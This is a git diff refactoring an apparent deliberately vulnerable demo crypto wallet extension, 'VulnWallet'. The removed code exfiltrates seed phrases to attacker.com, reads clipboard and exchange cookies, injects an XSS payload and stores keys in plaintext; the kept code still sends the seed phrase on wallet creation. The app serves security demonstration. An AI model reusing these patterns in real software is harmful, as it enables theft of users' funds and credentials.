@@ -1,27 +1,5 @@
-// VulnWallet popup.js
-// Wallet logic and vulnerabilities
-
-// Wallet state management
-let walletState = {
-  address: null,
-  balance: 0,
-  network: 'ethereum',
-  transactions: []
-};
-
-// Initialize wallet from storage
-function initWallet() {
-  const savedState = localStorage.getItem('walletState');
-  if (savedState) {
-    walletState = JSON.parse(savedState);
-    updateUI();
-  }
-}
-
-// Save wallet state
-function saveWalletState() {
-  localStorage.setItem('walletState', JSON.stringify(walletState));
-}
+import { walletState, updateWalletState } from './walletState.js';
+import { simulateExfiltration, insecureStorage } from './vulnerabilities.js';
 
 // Generate random wallet address
 function generateAddress() {
@@ -43,10 +21,9 @@ function generateSeedPhrase() {
   return seed.join(' ');
 }
 
-// Create new wallet
-function createWallet() {
+export function createWallet() {
   const seedPhrase = generateSeedPhrase();
-  walletState = {
+  const newState = {
     address: generateAddress(),
     balance: 1.0,
     network: 'ethereum',
@@ -54,152 +31,32 @@ function createWallet() {
     seedPhrase: seedPhrase
   };
 
-  // Demonstrate vulnerabilities
   simulateExfiltration({
     type: 'wallet_creation',
-    address: walletState.address,
+    address: newState.address,
     seedPhrase: seedPhrase
   });
-  insecureStorage(walletState);
+  insecureStorage(newState);
 
-  saveWalletState();
-  updateUI();
+  updateWalletState(newState);
+  return newState;
 }
 
-// Import wallet from seed phrase
-function importWallet(seedPhrase) {
+export function importWallet(seedPhrase) {
   // In a real wallet, this would derive the address from the seed phrase
   // For demo purposes, we'll just generate a new address
-  walletState = {
+  const newState = {
     address: generateAddress(),
     balance: 0,
     network: 'ethereum',
     transactions: [],
     seedPhrase: seedPhrase
   };
-  saveWalletState();
-  updateUI();
+  updateWalletState(newState);
+  return newState;
 }
 
-// Vulnerability: Excessive Permissions Abuse
-async function abusePermissions() {
-  try {
-    // 1. Clipboard Access (without proper user context)
-    const clipboard = await navigator.clipboard.readText();
-    localStorage.setItem('vw_clipboard_data', clipboard);
-
-    // 2. Tab Access (reading current tab URL)
-    const tabs = await chrome.tabs.query({active: true, currentWindow: true});
-    if (tabs[0]) {
-      localStorage.setItem('vw_current_tab', tabs[0].url);
-    }
-
-    // 3. Cookie Access (attempting to read cookies from other domains)
-    try {
-      const cookies = await chrome.cookies.getAll({domain: 'binance.com'});
-      localStorage.setItem('vw_binance_cookies', JSON.stringify(cookies));
-    } catch (e) {
-      console.log('Cookie access denied');
-    }
-  } catch (e) {
-    console.log('Permission abuse failed:', e);
-  }
-}
-
-// Vulnerability: Man-in-the-Middle (MitM) Simulation
-async function simulateMitM() {
-  try {
-    // Simulate fetching token prices from an insecure endpoint
-    const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd', {
-      method: 'GET',
-      headers: {
-        'Accept': 'application/json'
-      }
-    });
-    const data = await response.json();
-
-    console.log(data);
-    
-    // Store manipulated prices
-    localStorage.setItem('vw_token_prices', JSON.stringify({
-      ETH: data.ETH * 0.95, // Manipulate price down by 5%
-      timestamp: Date.now()
-    }));
-    
-    return data;
-  } catch (e) {
-    console.log('MitM simulation failed:', e);
-    // Fallback to hardcoded prices
-    return {
-      ETH: 2000,
-      timestamp: Date.now()
-    };
-  }
-}
-
-// Vulnerability: Cross-Site Scripting (XSS)
-function simulateXSS(memo) {
-  // Unsafe memo handling - allows script injection
-  const txList = document.getElementById('tx-list');
-  if (txList && memo) {
-    // Vulnerable to XSS if memo contains script tags
-    const txEl = document.createElement('div');
-    txEl.className = 'tx-item';
-    txEl.innerHTML = `
-      <div style="display:flex;justify-content:space-between;margin-bottom:4px;">
-        <span style="color:#b6b8d6;">✓ 0.1 ETH</span>
-        <span style="font-size:0.9em;color:#b6b8d6;">${new Date().toLocaleTimeString()}</span>
-      </div>
-      <div style="font-size:0.9em;color:#b6b8d6;">Memo: ${memo}</div>
-    `;
-    txList.prepend(txEl);
-  }
-}
-
-// Vulnerability: Data Exfiltration
-function simulateExfiltration(data) {
-  // Simulate data exfiltration through various channels
-  const exfilChannels = [
-    // 1. Fake API endpoint
-    () => fetch('https://jsonplaceholder.typicode.com/posts', {
-      method: 'POST',
-      body: JSON.stringify(data)
-    }),
-    // 2. WebSocket connection
-    () => {
-      const ws = new WebSocket('ws://attacker.com/ws');
-      ws.onopen = () => ws.send(JSON.stringify(data));
-    },
-    // 3. Image pixel tracking
-    () => {
-      const img = new Image();
-      img.src = `http://attacker.com/track?data=${btoa(JSON.stringify(data))}`;
-    }
-  ];
-
-  // Try each exfiltration channel
-  exfilChannels.forEach(channel => {
-    try {
-      channel();
-    } catch (e) {
-      console.log('Exfiltration channel failed:', e);
-    }
-  });
-}
-
-// Vulnerability: Insecure Data Storage
-function insecureStorage(data) {
-  // Store sensitive data in localStorage without encryption
-  localStorage.setItem('vw_wallet_data', JSON.stringify({
-    ...data,
-    seedPhrase: data.seedPhrase, // Storing seed phrase in plaintext
-    privateKey: '0x' + Math.random().toString(16).slice(2), // Simulated private key
-    lastBackup: new Date().toISOString()
-  }));
-}
-
-// Send transaction
-async function sendTransaction(to, amount, memo = '') {
+export async function sendTransaction(to, amount, memo = '') {
   if (amount > walletState.balance) {
     throw new Error('Insufficient balance');
   }
@@ -215,217 +72,25 @@ async function sendTransaction(to, amount, memo = '') {
     status: 'pending'
   };
 
-  // Update balance
-  walletState.balance -= amount;
-  walletState.transactions.unshift(tx);
-  
-  // Demonstrate vulnerabilities
-  await abusePermissions(); // Excessive permissions
-  await simulateMitM(); // MitM simulation
-  simulateXSS(memo); // XSS vulnerability
-  simulateExfiltration({ // Data exfiltration
-    type: 'transaction',
-    data: tx,
-    wallet: walletState.address
-  });
-  insecureStorage({ // Insecure storage
+  // Update balance and transactions
+  const newState = {
     ...walletState,
-    lastTransaction: tx
-  });
-
-  saveWalletState();
-  updateUI();
+    balance: walletState.balance - amount,
+    transactions: [tx, ...walletState.transactions]
+  };
+  
+  updateWalletState(newState);
 
   // Simulate transaction confirmation
   setTimeout(() => {
     tx.status = 'confirmed';
-    saveWalletState();
-    updateUI();
+    updateWalletState({
+      ...walletState,
+      transactions: walletState.transactions.map(t => 
+        t.hash === tx.hash ? { ...t, status: 'confirmed' } : t
+      )
+    });
   }, 2000);
 
   return tx;
-}
-
-// Update UI based on wallet state
-function updateUI() {
-  const walletInfo = document.getElementById('wallet-info');
-  const createBtn = document.getElementById('create-wallet-btn');
-  const importBtn = document.getElementById('import-wallet-btn');
-  const balanceEth = document.getElementById('balance-eth');
-  const balanceUsd = document.getElementById('balance-usd');
-  const walletAddress = document.getElementById('wallet-address');
-  const txList = document.getElementById('tx-list');
-  const networkSelect = document.getElementById('network-select');
-
-  if (walletState.address) {
-    walletInfo.style.display = 'block';
-    createBtn.style.display = 'none';
-    importBtn.style.display = 'none';
-    
-    balanceEth.textContent = walletState.balance.toFixed(4);
-    balanceUsd.textContent = (walletState.balance * 2000).toFixed(2); // Simulated ETH price
-    walletAddress.textContent = walletState.address;
-    networkSelect.value = walletState.network;
-
-    // Update transaction list
-    txList.innerHTML = '';
-    walletState.transactions.slice(0, 5).forEach(tx => {
-      const txEl = document.createElement('div');
-      txEl.className = 'tx-item';
-      txEl.innerHTML = `
-        <div style="display:flex;justify-content:space-between;margin-bottom:4px;">
-          <span style="color:#b6b8d6;">${tx.status === 'pending' ? '⏳' : '✓'} ${tx.amount} ETH</span>
-          <span style="font-size:0.9em;color:#b6b8d6;">${new Date(tx.timestamp).toLocaleTimeString()}</span>
-        </div>
-        <div style="font-size:0.9em;color:#b6b8d6;">To: ${tx.to.slice(0, 6)}...${tx.to.slice(-4)}</div>
-        ${tx.memo ? `<div style="font-size:0.9em;color:#b6b8d6;margin-top:4px;">${tx.memo}</div>` : ''}
-      `;
-      txList.appendChild(txEl);
-    });
-  } else {
-    walletInfo.style.display = 'none';
-    createBtn.style.display = '';
-    importBtn.style.display = '';
-  }
-}
-
-// Event Listeners
-document.addEventListener('DOMContentLoaded', () => {
-  // Initialize wallet
-  initWallet();
-
-  // Create wallet button
-  document.getElementById('create-wallet-btn').addEventListener('click', () => {
-    createWallet();
-  });
-
-  // Import wallet button
-  document.getElementById('import-wallet-btn').addEventListener('click', () => {
-    const seedPhrase = prompt('Enter your seed phrase:');
-    if (seedPhrase) {
-      importWallet(seedPhrase);
-    }
-  });
-
-  // Send form
-  document.getElementById('transfer-form').addEventListener('submit', async (e) => {
-    e.preventDefault();
-    const to = document.getElementById('recipient').value;
-    const amount = parseFloat(document.getElementById('amount').value);
-    const memo = document.getElementById('memo').value;
-
-    try {
-      await sendTransaction(to, amount, memo);
-      document.getElementById('send-form').style.display = 'none';
-      document.getElementById('transfer-form').reset();
-    } catch (error) {
-      alert(error.message);
-    }
-  });
-
-  // Quick action buttons
-  document.getElementById('send-btn').addEventListener('click', () => {
-    document.getElementById('send-form').style.display = 
-      document.getElementById('send-form').style.display === 'none' ? 'block' : 'none';
-    document.getElementById('receive-form').style.display = 'none';
-  });
-
-  document.getElementById('receive-btn').addEventListener('click', () => {
-    document.getElementById('receive-form').style.display = 
-      document.getElementById('receive-form').style.display === 'none' ? 'block' : 'none';
-    document.getElementById('send-form').style.display = 'none';
-  });
-
-  document.getElementById('swap-btn').addEventListener('click', () => {
-    alert('Swap functionality coming soon!');
-  });
-
-  // Copy address button
-  document.getElementById('copy-address').addEventListener('click', () => {
-    navigator.clipboard.writeText(walletState.address);
-    alert('Address copied to clipboard!');
-  });
-
-  // Network selector
-  document.getElementById('network-select').addEventListener('change', (e) => {
-    walletState.network = e.target.value;
-    saveWalletState();
-    updateUI();
-  });
-
-  // Refresh balance button
-  document.getElementById('refresh-balance').addEventListener('click', () => {
-    // Simulate balance update
-    walletState.balance = parseFloat((walletState.balance + Math.random() * 0.1).toFixed(4));
-    saveWalletState();
-    updateUI();
-  });
-
-  // Dev panel
-  document.getElementById('toggle-dev').addEventListener('click', () => {
-    const devContent = document.getElementById('dev-content');
-    devContent.style.display = devContent.style.display === 'none' ? 'block' : 'none';
-    document.getElementById('toggle-dev').textContent = 
-      devContent.style.display === 'none' ? 'Show' : 'Hide';
-  });
-
-  document.getElementById('exfil-seed').addEventListener('click', () => {
-    if (!walletState.seedPhrase) {
-      alert('No wallet to exfiltrate!');
-      return;
-    }
-    // Simulate exfiltration
-    fetch('http://attacker.com/exfil', {
-      method: 'POST',
-      body: JSON.stringify({ seed: walletState.seedPhrase })
-    }).then(() => {
-      document.getElementById('dev-status').textContent = 'Seed exfiltrated! (Simulated)';
-    }).catch(() => {
-      document.getElementById('dev-status').textContent = 'Exfiltration failed.';
-    });
-  });
-
-  document.getElementById('show-seed').addEventListener('click', () => {
-    if (!walletState.seedPhrase) {
-      alert('No wallet to show!');
-      return;
-    }
-    alert(`Your seed phrase: ${walletState.seedPhrase}\n\nWARNING: Never share your seed phrase with anyone!`);
-  });
-
-  // Add vulnerability demonstration buttons to dev panel
-  const devContent = document.getElementById('dev-content');
-  const vulnButtons = `
-    <button id="demo-permissions" class="danger-btn">Demo Permissions Abuse</button>
-    <button id="demo-mitm" class="danger-btn">Demo MitM Attack</button>
-    <button id="demo-xss" class="danger-btn">Demo XSS</button>
-    <button id="demo-exfil" class="danger-btn">Demo Exfiltration</button>
-    <button id="demo-storage" class="danger-btn">Demo Insecure Storage</button>
-  `;
-  devContent.insertAdjacentHTML('beforeend', vulnButtons);
-
-  // Add event listeners for vulnerability demonstration
-  document.getElementById('demo-permissions').addEventListener('click', abusePermissions);
-  document.getElementById('demo-mitm').addEventListener('click', async () => {
-    const prices = await simulateMitM();
-    document.getElementById('dev-status').textContent = 
-      `MitM simulated! ETH price: $${prices.ETH}`;
-  });
-  document.getElementById('demo-xss').addEventListener('click', () => {
-    simulateXSS('<img src=https://media.tenor.com/2nEy5Ee9d3EAAAAj/13th.gif onerror="alert(\'XSS Demo\')">');
-    document.getElementById('dev-status').textContent = 'XSS demo executed!';
-  });
-  document.getElementById('demo-exfil').addEventListener('click', () => {
-    simulateExfiltration({
-      type: 'demo',
-      timestamp: Date.now(),
-      wallet: walletState.address
-    });
-    document.getElementById('dev-status').textContent = 'Exfiltration demo executed!';
-  });
-  document.getElementById('demo-storage').addEventListener('click', () => {
-    insecureStorage(walletState);
-    document.getElementById('dev-status').textContent = 
-      'Data stored insecurely! Check localStorage.';
-  });
-}); 
+} 
